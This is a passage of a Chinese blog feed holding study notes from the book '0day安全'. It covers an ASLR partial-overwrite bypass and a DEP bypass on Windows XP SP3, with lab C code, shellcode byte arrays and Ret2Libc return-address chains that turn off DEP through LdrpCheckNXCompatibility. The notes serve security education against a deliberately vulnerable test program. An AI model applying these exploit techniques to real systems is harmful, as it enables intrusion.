class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627183840453.png" alt="image-20220627183840453"></p><p>如上图所示，函数返回地址的后两个字节已经被覆盖为 0x90 了。接下来就是寻找一条适合的跳板地址，由于是部分覆盖，所以 shellcode 只能放在返回地址前面，这样 JMP ESP 指令就不能再使用了。我们需要让函数跳转执行 shellcode，所以要向低地址跳转，观察寄存器，只有EAX 符合（EAX 指向 tt 的起始地址）。将函数返回地址覆盖为 CALL/JMP EAX 的指令地址（0x00b7141c）。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627210954342.png" alt="image-20220627210954342"></p><p>选择 ASLR_Offbyone.exe 中的指令，因为只有它里面的指令才有可能控制，我们选择 0x0008141C，重启系统后再查找一次。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627211702027.png" alt="image-20220627211702027"></p><h3 id="布置-shellcode"><a class="markdownIt-Anchor" href="#布置-shellcode"></a> 布置 shellcode</h3><p>Shellcode 最开始部分为弹出对话框的机器码，然后是 0x90 填充，最后为用来覆盖返回地址后 2 个字节的 0x141C。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627212644231.png" alt="image-20220627212644231"></p><figure class="highlight v"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x1C\x14&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>运行成功，即使是重启系统，shellcode 依然能成功执行。</p><p><img src="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/../../document/Markdown/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/image-20220627214549655.png" alt="image-20220627214549655"></p><h1 id="利用-heap-spray-技术定位内存"><a class="markdownIt-Anchor" href="#利用-heap-spray-技术定位内存"></a> 利用 Heap spray 技术定位内存</h1><p>Heap spray 原理：通过申请大量内存，占领内存中的 0x0C0C0C0C 的位置，并在这些内存中放置 0x90 和 shellcode，最后控制程序转入 0x0C0C0C0C 执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内存随机化保护机制的原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#内存随机化保护机制的原理&quot;&gt;&lt;/a&gt; 内存随机化保护机制的原理&lt;/h1&gt;
&lt;p&gt;前面的所有漏洞利用都有一个共同特征：都需要确定一个明确的跳转地址。而 ASLR（Ad</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ASLR" scheme="https://www.rgzzplus.com/tags/ASLR/"/>
    
  </entry>
  
  <entry>
    <title>数据与程序的分水岭:DEP</title>
    <link href="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/"/>
    <id>https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/</id>
    <published>2022-06-27T01:21:00.000Z</published>
    <updated>2022-06-27T01:40:50.893Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dep-机制的保护原理"><a class="markdownIt-Anchor" href="#dep-机制的保护原理"></a> DEP 机制的保护原理</h1><p>溢出攻击的<strong>根源</strong>在于计算机未明确区分数据和代码，DEP（数据执行保护，Data Execution Prevention）的<strong>基本原理</strong>就是将数据所在页面标识为不可执行。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618160130800-16562939498331.png" alt="image-20220618160130800"></p><h2 id="dep-的主要作用"><a class="markdownIt-Anchor" href="#dep-的主要作用"></a> <strong>DEP 的主要作用</strong>：</h2><p>阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。</p><p>根据实现的机制不同可分为：软件DEP（Software DEP）和硬件DEP（Hardware-enforced DEP）</p><p><strong>软件DEP</strong>就是SafeSEH，阻止利用 S.E.H 的攻击。</p><p><strong>硬件DEP</strong>需要CPU支持，AMD 称之为 No-Execute Page-Protection（NX），Intel 称之为 Execute Disable Bit（XD）。</p><p>操作系统通过设置内存页的 <strong>NX/XD 属性标记</strong>，来指明不能从该内存执行代码。内存的页面表（Page Table）中的标识位（NX/XD）来标识是否允许在该页上执行指令。标识位为 0 表示这个页面允许执行指令，设置为 1 表示该页面不允许执行指令。</p><h2 id="dep-工作状态"><a class="markdownIt-Anchor" href="#dep-工作状态"></a> <strong>DEP 工作状态：</strong></h2><p>（1）Option：默认仅将 DEP 保护应用于 Windows 系统组件和服务。但用户可以通过应用程序兼容性工具(ACT， Application Compatibility Toolkit)为选定的程序启用 DEP。DEP 可被程序动态关闭。</p><p>（2）Optout：为排除列表程序外的所有程序和服务启用 DEP，用户可以手动在排除列表中指定不启用 DEP 保护的程序和服务。DEP 可被应用程序动态关闭。</p><p>（3）AlwaysON：对所有进程启用 DEP 保护，不存在排序列表，DEP 不可被关闭。</p><p>（4）AlwaysOff：对所有进程禁用 DEP，DEP 不能动态开启。</p><h2 id="和-dep-密切相关的程序链接选项nxcompat"><a class="markdownIt-Anchor" href="#和-dep-密切相关的程序链接选项nxcompat"></a> <strong>和 DEP 密切相关的程序链接选项</strong>：/NXCOMPAT</h2><p>在Visual Studio 2008 ( VS 9.0)中，可以在通过菜单中的 Project→<br>project Properties → Configuration Properties→ Linker→ Advanced→ Data Execution Prevention(DEP)中选择是不是使用/NXCOMPAT 编译程序，如下图所示。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618165748260-16562939498342.png" alt="image-20220618165748260"></p><p>采用/NXCOMPAT 编译的程序会在文件的 PE 头中设置 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 标识，该标识通过结构体 IMAGE_OPTIONAL_HEADER 中的 DllCharacteristics 变量进行体现，<strong>当 DllCharacteristics 设置为 0x0100 表示该程序采用了/NXCOMPAT 编译</strong>。</p><p>操作系统中 DEP 一般工作在 Option状态，只保护系统核心进程，而经过 /NXCOMPAT 编译的程序在 Windows vista及后续版本中会<strong>自动启用 DEP 保护</strong>。</p><h2 id="dep的局限"><a class="markdownIt-Anchor" href="#dep的局限"></a> <strong>DEP的局限：</strong></h2><p>（1）硬件 DEP 需要 CPU 支持。<br>（2）由于兼容性，windows 不能对所有进程开启 DEP 保护。<br>（3）/NXCOMPAT 编译选项，或者是 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 的设置，只对 windows vista 以上的系统有效。<br>（4）当 DEP 工作在 Option 和 Optout 下时，DEP 是可以被动态关闭和开启的，这就说明操作系统提供了某些 API 函数控制 DEP状态。早期的 API 调用没有任何限制。</p><h1 id="攻击未启用-dep-的程序"><a class="markdownIt-Anchor" href="#攻击未启用-dep-的程序"></a> 攻击未启用 DEP 的程序</h1><p>DEP 保护对象是进程级的，当某个进程的加载模块中只要有一个模块不支持 DEP，这个进程就不能贸然开启 DEP，否则可能会发生异常。在此不做讨论。</p><h1 id="利用-ret2libc-挑战-dep"><a class="markdownIt-Anchor" href="#利用-ret2libc-挑战-dep"></a> 利用 Ret2Libc 挑战 DEP</h1><p>在 DEP 保护下溢出失败的根本原因是 DEP 检测到程序转到非可执行页执行指令了，如果让程序跳转到一个已经存在的系统函数中（必然处于可执行页上），DEP是不会拦截的。</p><p>Ret2Libc 是 Return-to-llibc 简写，只要为 shellcode 中的每条指令都在代码区找到一条替代指令，就能完成 exploit 想要的功能了。但这仅仅是理论上可行，实际上操作难度极大。</p><h2 id="绕过-dep-的-exploit-方法"><a class="markdownIt-Anchor" href="#绕过-dep-的-exploit-方法"></a> 绕过 DEP 的 exploit 方法：</h2><p>（1）通过跳转到 ZwSetInformationProcess 函数将 DEP 关闭后再转入 shellcode 执行。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618171923634-16562939498343.png" alt="image-20220618171923634"></p><p>（2）通过跳转到 VirtualProtect 函数来将 shellcode 所在内存页设置为可执行状态，然后再转入 shellcode 执行。<br>（3）通过跳转到 VIrtualAlloc 函数开辟一段具有执行权限的内存空间，然后将 shellcode 复制到这段内存中执行。</p><h3 id="ret2libc-实战之利用-zwsetinformationprocess"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-zwsetinformationprocess"></a> Ret2Libc 实战之利用 ZwSetinformationProcess</h3><p>将进程 DEP 保护关闭。</p><p>一个进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API 函数 ZwQueryInformationProcess 和 ZwSetInformationProcess 进行查询和修改。</p><blockquote><p>题外话： 在有些资料中将这些函数称为 NtQueryInformationProcess 和 NtSetInformation Process，在 Ntdll.dll 中 Nt<strong>函数和 Zw</strong>函数功能是完全一样的，本书中我们统一称之为 Zw**。</p></blockquote><p>_KEXECUTE_OPTIONS 的结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">KEXECUTE_OPTIONS</span><br><span class="line">Pos0ExecuteDisable :1bit</span><br><span class="line">Pos1ExecuteEnable :1bit</span><br><span class="line">Pos2DisableThunkEmulation :1bit</span><br><span class="line">Pos3Permanent :1bit</span><br><span class="line">Pos4ExecuteDispatchEnable :1bit</span><br><span class="line">Pos5ImageDispatchEnable :1bit</span><br><span class="line">Pos6Spare :2bit</span><br></pre></td></tr></table></figure><p>前4个 bit 与 DEP 相关，当前进程 DEP 开启时 ExecuteDisable 位被置 1，当进程 DEP 关闭时 ExecuteEable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的，Permanent 被置 1 后表示这些标志都不能再被修改。</p><p>函数 NtSetInformationProcess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ZwSetInformationProcess(</span><br><span class="line">IN HANDLE ProcessHandle,</span><br><span class="line">IN PROCESS_INFORMATION_CLASS ProcessInformationClass,</span><br><span class="line">IN PVOID ProcessInformation,</span><br><span class="line">IN ULONG ProcessInformationLength );</span><br></pre></td></tr></table></figure><p>第一个参数为进程的句柄，设置为-1 的时候表示为当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS，第四个参数为第三个参数的长度。</p><p>关闭 DEP 的参数设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;</span><br><span class="line">ZwSetInformationProcess(</span><br><span class="line">NtCurrentProcess(), // (HANDLE)-1</span><br><span class="line">ProcessExecuteFlags, // 0x22</span><br><span class="line">&amp;ExecuteFlags, // ptr to 0x2</span><br><span class="line">sizeof(ExecuteFlags)); // 0x4</span><br></pre></td></tr></table></figure><p>函数的参数中包含 0x00，会造成字符串复制时被截断。既然自己构造参数会出问题，那么就在系统中寻找已经构造好的参数。</p><p>如果一个进程的 Permanent 位没有设置，当它加载 DLL 时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭。LdrpCheckNXCompatibility 函数，当符合以下条件之一时进程的 DEP 会被关闭：<br>（ 1）当 DLL 受 SafeDisc 版权保护系统保护时；<br>（ 2）当 DLL 包含有.aspcak、 .pcle、 .sforce 等字节时；<br>（ 3） Windows Vista 下面当 DLL 包含在注册表“ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions ”键下边标识出不需要启动 DEP 的模块时。</p><p>在 Windows XP SP3 下 LdrpCheckNXCompatibility 关闭 DEP 的具体流程，以 SafeDisc 为例，如下图：</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618173743193-16562939498344.png" alt="image-20220618173743193"></p><p>模拟 LdrpCheckNXCompatibility 关闭 DEP 的流程，先想办法将 AL 赋值为1，然后转入执行 0x7C93CD24（CMP AL,1） 及后续指令来关闭 DEP，代码如下。</p><h4 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x52\xE2\x92\x7C&quot;</span><span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line">    <span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line">    <span class="string">&quot;\x19\x4A\x97\x7C&quot;</span><span class="comment">//增大 ESP</span></span><br><span class="line">    <span class="string">&quot;\xB4\xC1\xC5\x7D&quot;</span><span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x24\xCD\x93\x7C&quot;</span><span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">    <span class="string">&quot;\xE9\x33\xFF\xFF&quot;</span><span class="comment">//回跳指令</span></span><br><span class="line">    <span class="string">&quot;\xFF\x90\x90\x90&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(tt,shellcode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，在实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。<br>（ 3）将函数的返回地址覆盖为类似 MOV AL,1 retn 的指令，在将 AL 置 1 后转入 0x7C93CD24 关闭 DEP。<br>（ 4）DEP 关闭后 shellcode 就可以正常执行了。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤：</h4><p><strong>（ 1）将 AL 置为 1，后执行关闭 DEP 指令。</strong></p><p>找到类似 MOV AL,1 RETN 的指令。OllyFindAddr 插件的 Disable DEP —&gt; Disable DEP &lt;= XP SP3 搜索结果的 Step2 就是符合要求的指令。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619135451210-16562939498345.png" alt="image-20220619135451210"></p><p>为避免 shellcode 在复制时被截断，需选择一个不包含 0x00 的地址，使用 0x7C92E252 覆盖函数的返回地址，让函数执行完后将 AL 置 1，然后返回控制流程。</p><p>先用小于 200 个0x90填充 shellcode，找出 tt[0] 的地址（0x0012FDB0)。然后在分析栈，找出 test() 的返回地址（0x0012FE64），来确定 shellcode 的长度为 184字节，shellcode 内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>调试运行，在 0x7C92E257（retn）处暂停程序，查看堆栈 ESP=0012FE68，指向 test() 返回地址下方，retn 将返回到 ESP 指向的内存空间（0x7C930200)。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619162125082-16562939498346.png" alt="image-20220619162125082"></p><p>所以我们要在 0x0012FE68 放上 0x7C93CD24（cmp al,1），来让程序转入关闭 DEP 流程，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><strong>（2）产生异常，EBP 指向位置无法写入，解决问题</strong></p><p>重新编译程序，在 0x7C93CD6F，即关闭 DEP 后的 retn 4 处下断点，然后运行。程序运行后，出现了异常，如下图。程序对 EBP-4 位置写入数据，但是 EBP 在溢出时候被破坏了，目前 EBP-4 为 90909090 不可写入，所以程序出现写入异常，在转入 0x7C93CD24 前我们需要将 EBP 指向一个可写的位置。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619172626766-16562939498347.png" alt="image-20220619172626766"></p><p>通过类似 PUSH ESP POP EBP RETN 的指令将 EBP 定位到一个可写的位置，用 OllyFindAddr 插件可在 Disable DEP &lt;= XP SP3 搜索结果的 Setp3 部分查看当前内存所有符合条件的指令，如下图所示。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619180931685-16562939498348.png" alt="image-20220619180931685"></p><p>现在，筛选出合适指令，找出可写入而不影响后续指令的寄存器，显然，PUSH ESP POP 